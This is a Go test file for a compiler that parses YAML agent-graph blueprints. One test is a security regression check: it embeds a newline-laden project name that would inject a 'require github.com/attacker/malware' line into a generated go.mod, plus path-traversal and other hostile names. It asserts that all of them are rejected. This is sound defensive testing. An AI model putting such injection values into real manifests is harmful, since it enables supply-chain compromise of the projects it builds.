package compiler

import (
	"os"
	"path/filepath"
	"strconv"
	"testing"
)

func TestParseBlueprint_Valid(t *testing.T) {
	// Setup
	tmpDir := t.TempDir()
	yamlContent := `
project: test-project
version: 1.0.0
graph:
  entry: agent
  max_steps: 10
nodes:
  - name: agent
    type: agent
    model: llama3
    instructions: "test instructions"
edges:
  - from: agent
    to: END
`
	path := filepath.Join(tmpDir, "valid.yaml")
	if err := os.WriteFile(path, []byte(yamlContent), 0644); err != nil {
		t.Fatal(err)
	}

	// Execute
	bp, err := ParseBlueprint(path)

	// Verify
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}
	if bp.Project != "test-project" {
		t.Errorf("expected project 'test-project', got '%s'", bp.Project)
	}
	if bp.Graph.MaxSteps != 10 {
		t.Errorf("expected max_steps 10, got %d", bp.Graph.MaxSteps)
	}
	if len(bp.Nodes) != 1 {
		t.Errorf("expected 1 node, got %d", len(bp.Nodes))
	}
}

func TestParseBlueprint_Invalid(t *testing.T) {
	// Setup
	tmpDir := t.TempDir()
	// Missing "entry" in graph config
	yamlContent := `
project: invalid-project
graph:
  max_steps: 10
nodes:
  - name: agent
    type: agent
`
	path := filepath.Join(tmpDir, "invalid.yaml")
	if err := os.WriteFile(path, []byte(yamlContent), 0644); err != nil {
		t.Fatal(err)
	}

	// Execute
	_, err := ParseBlueprint(path)

	// Verify
	if err == nil {
		t.Fatal("expected validation error (missing entry), got nil")
	}
}

// TestValidate_ProjectNameCharset (SEC F1, Finding 1): bp.Project becomes the
// go.mod module directive (generator.go:465 `module %s`) and a runtime
// filesystem path (generator.go:280 dsn = bp.Project + ".db"), yet validate()
// historically checked it for non-emptiness only. A project name carrying a
// newline breaks out of the module directive and injects arbitrary top-level
// go.mod content. This test is the red proof that the injection is refused:
// hostile charsets fail validation, legitimate names still pass.
func TestValidate_ProjectNameCharset(t *testing.T) {
	// The exact SEC repro: a newline-carrying project name that injects a
	// require directive above the framework lines of the emitted go.mod.
	injection := "evil\n\nrequire github.com/attacker/malware v6.6.6"
	yamlContent := "project: " + strconv.Quote(injection) + `
version: 0.1.0
graph:
  entry: agent
  max_steps: 5
nodes:
  - name: agent
    type: agent
    model: llama3
edges:
  - from: agent
    to: END
`
	if _, err := ParseBlueprintBytes([]byte(yamlContent)); err == nil {
		t.Fatal("SEC F1 Finding 1 FAIL: a project name with an embedded newline (go.mod directive injection) was accepted; validate() must constrain bp.Project's charset")
	}

	// A table over the charset boundary: hostile names refused, legitimate
	// names (including every project name the suite emits) accepted.
	base := func(project string) string {
		return "project: " + strconv.Quote(project) + `
version: 0.1.0
graph:
  entry: agent
  max_steps: 5
nodes:
  - name: agent
    type: agent
    model: llama3
edges:
  - from: agent
    to: END
`
	}

	rejected := map[string]string{
		"embedded newline":      "evil\nrequire x",
		"carriage return":       "evil\rx",
		"tab":                   "evil\tx",
		"space":                 "my project",
		"double quote":          "evil\"x",
		"backslash":             "evil\\x",
		"forward slash (path)":  "github.com/attacker/malware",
		"path traversal":        "../../etc/evil",
		"leading dot":           ".evil",
		"trailing dot":          "evil.",
		"leading hyphen":        "-evil",
		"go.mod directive char": "evil // require x",
	}
	for name, project := range rejected {
		if _, err := ParseBlueprintBytes([]byte(base(project))); err == nil {
			t.Errorf("Finding 1 FAIL: hostile project name (%s) %q was accepted; must be refused", name, project)
		}
	}

	accepted := []string{
		"test-project", "invalid-project", "gen-resident", "gen-escape",
		"ac1-two-by-two", "gen-compile-mixed", "legacy", "ac6",
		"agent.v2", "hello_agent", "a",
	}
	for _, project := range accepted {
		if _, err := ParseBlueprintBytes([]byte(base(project))); err != nil {
			t.Errorf("Finding 1 FAIL: legitimate project name %q was refused: %v", project, err)
		}
	}
}

func TestParseBlueprint_InvalidName(t *testing.T) {
	// Setup
	tmpDir := t.TempDir()
	// Invalid node name "my-agent" (contains dash)
	yamlContent := `
project: invalid-name
graph:
  entry: agent
  max_steps: 10
nodes:
  - name: my-agent
    type: agent
`
	path := filepath.Join(tmpDir, "invalid_name.yaml")
	if err := os.WriteFile(path, []byte(yamlContent), 0644); err != nil {
		t.Fatal(err)
	}

	// Execute
	_, err := ParseBlueprint(path)

	// Verify
	if err == nil {
		t.Fatal("expected validation error (invalid node name), got nil")
	}
}
